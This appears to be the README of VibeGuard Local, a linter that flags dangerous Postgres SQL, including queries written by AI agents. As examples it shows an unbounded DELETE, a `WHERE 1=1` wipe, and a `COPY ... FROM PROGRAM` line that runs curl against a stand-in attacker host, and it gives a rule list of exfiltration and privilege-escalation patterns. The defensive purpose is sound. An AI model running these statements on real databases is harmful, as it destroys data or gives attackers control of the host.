# VibeGuard — Local

> **AI agents are writing SQL against your production database. This catches the dangerous queries before they run.**
> 36 checks. Sub-millisecond. Runs in your CLI, your editor, or right in your browser.

[![@vibeguard-dev/local](https://img.shields.io/npm/v/@vibeguard-dev/local?label=%40vibeguard-dev%2Flocal)](https://www.npmjs.com/package/@vibeguard-dev/local)
[![eslint-plugin-vibeguard](https://img.shields.io/npm/v/eslint-plugin-vibeguard?label=eslint-plugin-vibeguard)](https://www.npmjs.com/package/eslint-plugin-vibeguard)
[![@vibeguard-dev/ui](https://img.shields.io/npm/v/@vibeguard-dev/ui?label=%40vibeguard-dev%2Fui)](https://www.npmjs.com/package/@vibeguard-dev/ui)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](./LICENSE)
[![CI](https://github.com/MuddySheep/vibeguard-local/actions/workflows/ci.yml/badge.svg)](https://github.com/MuddySheep/vibeguard-local/actions/workflows/ci.yml)
[![Playground](https://github.com/MuddySheep/vibeguard-local/actions/workflows/playground-deploy.yml/badge.svg)](https://muddysheep.github.io/vibeguard-local/)

---

## Who this is for

If you're in any of these three situations, this is for you:

- **You write SQL by hand** — migrations, RPC bodies, ad-hoc fixes. One missing `WHERE` clause can wipe a table at 11pm and you spend Saturday restoring from backup.
- **You use generated SQL** — Drizzle, Prisma, raw `` sql`...` `` template literals. Most of it is safe; the dangerous queries are the ones you wrote yourself in a tagged template and never linted.
- **You let AI agents touch your database** — Cursor, Claude Code, Replit Agent, custom orchestrators. The agent confidently generates a `DELETE FROM users` and you find out it ran when the support tickets start.

If your entire workflow is structured query builders you never override (`.from().select().eq()` chains, ActiveRecord without `find_by_sql`), this isn't for you — those are already parameterized and safe by construction. **The moment SQL gets written — by you, by your team, or by an AI — that's when this kicks in.**

---

## Try it in your browser → [muddysheep.github.io/vibeguard-local](https://muddysheep.github.io/vibeguard-local/)

Paste any SQL query, see what gets caught. Or click one of 36 ready-made samples — one per shipped check. Runs entirely in your browser via WASM. Your SQL never leaves the page.

[![VibeGuard playground — dark theme](./docs/img/playground-dark.png)](https://muddysheep.github.io/vibeguard-local/)

---

## Three queries that look fine and aren't

Real shapes that have caused real outages. Paste any of these into the playground and watch what happens.

### 1. The "audit log makes it look bounded" trick

```sql
WITH deleted_users AS (
    DELETE FROM users
    RETURNING id, account_status
)
INSERT INTO audit_log (user_id, action)
SELECT id, 'purged' FROM deleted_users
WHERE account_status = 0;
```

**Looks like:** we only purge inactive users — there's a `WHERE account_status = 0` right there.
**Actually does:** deletes every row in `users`. The `WHERE` is on the outer `SELECT`, not the `DELETE`. The audit log just *looks* clean.
**VibeGuard catches:** `SQL-003 (block, 97) — Unbounded DELETE statement.`

### 2. The `WHERE 1=1` placeholder that ships to production

```sql
DELETE FROM users WHERE 1=1;
```

**Looks like:** scoped — there's a `WHERE` clause.
**Actually does:** deletes everything. AI agents leave `WHERE 1=1` as a placeholder they "intend to fill in." Sometimes they don't.
**VibeGuard catches:** `SQL-034 (block, 95) — literal tautology on DELETE.`

### 3. The Postgres feature that's also remote code execution

```sql
COPY users FROM PROGRAM 'curl http://attacker.com/payload.csv';
```

**Looks like:** a normal `COPY` for loading data.
**Actually does:** runs `curl` (or any shell command) on the database server. If an AI agent has DB credentials and writes this, it's RCE on your Postgres host. This is documented Postgres behavior, not a vulnerability — and most people don't know it exists.
**VibeGuard catches:** `SQL-016 (block, 99) — COPY ... FROM PROGRAM.`

There are 33 more like these. Full list is below.

---

## Install

### `@vibeguard-dev/local` — the SDK + CLI

```bash
npm install @vibeguard-dev/local libpg-query
```

```ts
import { analyze, init } from '@vibeguard-dev/local';

await init(); // one-time WASM-parser bootstrap

const result = analyze(`UPDATE users SET email = 'x@y.com'`);
//   → { catches: [{ code: 'SQL-003', severity: 'block', confidence: 99, … }] }
```

CLI:

```bash
npx @vibeguard-dev/local init                 # scaffold a sample + lint:sql script
vg-local analyze 'src/**/*.sql'               # CI-friendly; exits 1 on any block-severity catch
vg-local analyze 'src/**/*.sql' --fix         # apply autofixes for SQL-001 / 005 / 006 / 011
vg-local analyze 'src/**/*.sql' --fix-dry-run # print a diff without writing
```

Full SDK and CLI reference: [`packages/sdk/README.md`](./packages/sdk/README.md).

### `eslint-plugin-vibeguard` — in-editor catches on `` sql`...` ``

```bash
npm install --save-dev eslint-plugin-vibeguard libpg-query
```

```js
// eslint.config.js (ESLint 9+ flat config)
import vibeguard from 'eslint-plugin-vibeguard';

export default [
  {
    files: ['**/*.{js,ts,tsx}'],
    plugins: { vibeguard },
    rules: { 'vibeguard/sql-safety': 'error' },
  },
];
```

Now `` sql`SELECT id FROM users WHERE active = NULL` `` underlines `active = NULL` in your editor. `--fix` rewrites it to `IS NULL`, like Prettier.

Full plugin docs: [`packages/eslint-plugin/README.md`](./packages/eslint-plugin/README.md).

### `@vibeguard-dev/ui` — the design system the playground uses

```bash
npm install @vibeguard-dev/ui react react-dom
```

```ts
import '@vibeguard-dev/ui/tokens.css';
import '@vibeguard-dev/ui/styles.css';
import { CatchCard, ThemeToggle, Mesh } from '@vibeguard-dev/ui';
```

Tokens (dark + light), `CatchCard`, `SeverityBadge`, `CodeBlock`, `Nav`, `ThemeToggle`, `Mesh` / `Grain` atmosphere primitives. Pre-1.0 — internal-API breakage between minor versions is allowed while the surface settles. Full inventory: [`packages/ui/README.md`](./packages/ui/README.md).

---

## What's in the playground

- **36 catch-keyed samples** — one preset per shipped rule (`SQL-001` through `SQL-036`). Click `SQL-013` to see a `DROP TABLE` get blocked. Click `SQL-005` for a `WHERE col = NULL` footgun. Click `SQL-034` for the `WHERE 1=1` tautology trap. The `SQL-014` chip auto-enables the default-OFF "missing RETURNING" rule for that sample.
- **Paste your own SQL** — re-analyzes on every keystroke. CodeMirror 6, Postgres syntax highlighting, line numbers.
- **AST view** — see what the parser actually saw. Useful when a catch surprises you.
- **Share via URL** — gzip + base64-encodes the editor contents into the URL hash. No backend, no tracking.
- **Dark / light theme** — persisted in `localStorage`.
- **Responsive** — works on phones; editor and results panel stack on narrow viewports.

| Light theme | AST viewer |
|---|---|
| ![Light theme — DROP TABLE block catch](./docs/img/playground-light.png) | ![AST viewer expanded](./docs/img/playground-ast.png) |

---

## The 36 catches

Each has a stable code (e.g. `SQL-001`), a severity, a confidence range, and a docs page. **Catch IDs are forever-stable** — once published, an ID always means the same thing (see [`STABILITY.md`](./packages/sdk/STABILITY.md)).

V1.0–V1.5 shipped 15 catches focused on correctness footguns (cartesian, NULL comparison, missing WHERE). V1.6 adds 21 Postgres-specific catches focused on **destruction, exfiltration, privilege escalation, and analyzer blind spots** (`SQL-016` through `SQL-036`).

| Code | Title | Severity | Confidence | Default | Auto-fix |
|---|---|---|---|---|---|
| [`SQL-001`](./packages/sdk/docs/rules/sql-001.md) | Cartesian explosion (also UPDATE…FROM, DELETE…USING) | block | 90–95 | ON | placeholder |
| [`SQL-002`](./packages/sdk/docs/rules/sql-002.md) | Self-join footgun (also UPDATE…FROM, DELETE…USING) | warn | 70–85 | ON | — |
| [`SQL-003`](./packages/sdk/docs/rules/sql-003.md) | Unbounded UPDATE / DELETE | block | 95–99 | ON | — |
| [`SQL-004`](./packages/sdk/docs/rules/sql-004.md) | Implicit type coercion in WHERE | warn | 75–85 | ON | — |
| [`SQL-005`](./packages/sdk/docs/rules/sql-005.md) | NULL comparison footgun | warn | 90–95 | ON | yes |
| [`SQL-006`](./packages/sdk/docs/rules/sql-006.md) | OFFSET without ORDER BY | warn | 85–95 | ON | placeholder |
| [`SQL-007`](./packages/sdk/docs/rules/sql-007.md) | NOT IN with nullable subquery | warn | 75–85 | ON | — |
| [`SQL-008`](./packages/sdk/docs/rules/sql-008.md) | String-concat injection patterns | block | 80–95 | ON | — |
| [`SQL-009`](./packages/sdk/docs/rules/sql-009.md) | DISTINCT without obvious reduction | info | 60–75 | ON | — |
| [`SQL-010`](./packages/sdk/docs/rules/sql-010.md) | Correlated subquery in SELECT | warn | 70–85 | ON | — |
| [`SQL-011`](./packages/sdk/docs/rules/sql-011.md) | Aggregate without GROUP BY | warn | 85–95 | ON | yes |
| [`SQL-012`](./packages/sdk/docs/rules/sql-012.md) | Recursive CTE without termination | block | 80–95 | ON | — |
| [`SQL-013`](./packages/sdk/docs/rules/sql-013.md) | DROP / TRUNCATE / DDL destruction | block / warn | 85–99 | ON | — |
| [`SQL-014`](./packages/sdk/docs/rules/sql-014.md) | INSERT/UPDATE/DELETE without RETURNING | info | 50 | **OFF** (opt-in) | — |
| [`SQL-015`](./packages/sdk/docs/rules/sql-015.md) | `SELECT *` over-fetch | info | 60 | ON | — |
| [`SQL-016`](./packages/sdk/docs/rules/sql-016.md) | `COPY … FROM/TO PROGRAM` (server-side RCE) | block | 99 | ON | — |
| [`SQL-017`](./packages/sdk/docs/rules/sql-017.md) | `CREATE EXTENSION` of untrusted procedural language | block | 95 | ON | — |
| [`SQL-018`](./packages/sdk/docs/rules/sql-018.md) | `ALTER TABLE … DROP COLUMN` (silent data loss) | warn | 90 | ON | — |
| [`SQL-019`](./packages/sdk/docs/rules/sql-019.md) | `CREATE TRIGGER` (hidden side effects per row) | info | 75 | ON | — |
| [`SQL-020`](./packages/sdk/docs/rules/sql-020.md) | `CREATE OR REPLACE FUNCTION` (silent overwrite) | info | 70 | ON | — |
| [`SQL-021`](./packages/sdk/docs/rules/sql-021.md) | `GRANT … TO PUBLIC` (over-broad permission) | warn | 90 | ON | — |
| [`SQL-022`](./packages/sdk/docs/rules/sql-022.md) | `CREATE/ALTER ROLE … SUPERUSER` (privilege escalation) | block | 95 | ON | — |
| [`SQL-023`](./packages/sdk/docs/rules/sql-023.md) | `pg_terminate_backend` / `pg_cancel_backend` (DoS) | warn | 85 | ON | — |
| [`SQL-024`](./packages/sdk/docs/rules/sql-024.md) | `VACUUM FULL` (ACCESS EXCLUSIVE outage) | warn | 80 | ON | — |
| [`SQL-025`](./packages/sdk/docs/rules/sql-025.md) | `REFRESH MATERIALIZED VIEW` (blocking refresh) | warn | 75 | ON | — |
| [`SQL-026`](./packages/sdk/docs/rules/sql-026.md) | `MERGE` with tautological `ON` (full-table mutation) | block | 90 | ON | — |
| [`SQL-027`](./packages/sdk/docs/rules/sql-027.md) | `SET search_path` to attacker-controlled schema | warn | 85 | ON | — |
| [`SQL-028`](./packages/sdk/docs/rules/sql-028.md) | `pg_create_*_replication_slot` (exfiltration channel) | warn | 80 | ON | — |
| [`SQL-029`](./packages/sdk/docs/rules/sql-029.md) | `dblink` / `CREATE SERVER` (outbound network) | warn | 80 | ON | — |
| [`SQL-030`](./packages/sdk/docs/rules/sql-030.md) | `pg_read_*` / `lo_export` / `pg_ls_dir` (server FS) | warn | 90 | ON | — |
| [`SQL-031`](./packages/sdk/docs/rules/sql-031.md) | `INSERT … SELECT … ON CONFLICT DO UPDATE` (unbounded upsert) | info | 75 | ON | — |
| [`SQL-032`](./packages/sdk/docs/rules/sql-032.md) | `EXPLAIN ANALYZE` of a destructive statement | info | 80 | ON | — |
| [`SQL-033`](./packages/sdk/docs/rules/sql-033.md) | `DO $$ … $$` opaque procedural block | info | 70 | ON | — |
| [`SQL-034`](./packages/sdk/docs/rules/sql-034.md) | `WHERE 1=1` / literal tautology on UPDATE/DELETE | block | 95 | ON | — |
| [`SQL-035`](./packages/sdk/docs/rules/sql-035.md) | `UPDATE … FROM` without join predicate (cross-join overwrite) | block | 90 | ON | — |
| [`SQL-036`](./packages/sdk/docs/rules/sql-036.md) | `DELETE … USING` without join predicate (cross-join wipe) | block | 90 | ON | — |

---

## What this is NOT

This is **static analysis only**. It checks the *shape* of the SQL text. It does not:

- compare an agent's stated intent against what its SQL would actually do
- estimate real blast radius from the upstream Postgres planner
- provide tamper-evident audit logging
- offer human-in-the-loop escalation for grey-zone queries
- track per-agent behavioral baselines over time

For those, there's a **VibeGuard Cloud** product — the wire-protocol proxy and MCP server this repo is the static-analysis layer of. Different product, different scope. The two are designed to work together: the OSS in your editor and CI, the Cloud between your agents and your production database.

---

## Dialect support

VibeGuard parses **Postgres SQL only**, via libpg-query (Postgres's own parser).

Queries in MySQL, MariaDB, or SQLite dialects will fail to parse. The most common surface for this is placeholder syntax — Postgres uses `$1, $2, $3`, while MySQL/MariaDB and many ORMs use `?`. A query like `INSERT INTO t (a, b) VALUES (?, ?)` will error with `syntax error near "?,?"` rather than running the rule analysis.

Multi-dialect support (MySQL, MariaDB, SQLite) is tracked in [#1](https://github.com/MuddySheep/vibeguard-local/issues/1). Not scheduled for v1.x. Most catches are dialect-agnostic in principle, so it's not impossible — it's a parser and test-surface investment that hasn't been made yet. If you want it prioritized, 👍 the issue and leave a comment with your stack.

---

## Repo layout
vibeguard-local/
├── packages/
│   ├── sdk/              # @vibeguard-dev/local — analyzer + CLI
│   ├── eslint-plugin/    # eslint-plugin-vibeguard — sql… rule
│   └── ui/               # @vibeguard-dev/ui — design tokens + React components
├── apps/
│   └── playground/       # the live web playground
└── .github/workflows/
├── ci.yml                  # typecheck + lint + test + build + size on every push
├── playground-deploy.yml   # build → deploy to GitHub Pages
└── release.yml             # creates draft GitHub Release on v* tag push

[pnpm workspace](https://pnpm.io/workspaces). Use `corepack enable` to pick up the version pinned in `package.json`, then:

```bash
pnpm install
pnpm -r --if-present build       # build first — workspace deps resolve types via dist/
pnpm -r --if-present typecheck
pnpm -r --if-present test
```

Architecture and contribution process: [`packages/sdk/CONTRIBUTING.md`](./packages/sdk/CONTRIBUTING.md), [`packages/sdk/ARCHITECTURE.md`](./packages/sdk/ARCHITECTURE.md).

---

## License

[Apache 2.0](./LICENSE) across the whole workspace. See [`packages/sdk/NOTICE`](./packages/sdk/NOTICE) for attribution requirements that travel with derivative works.
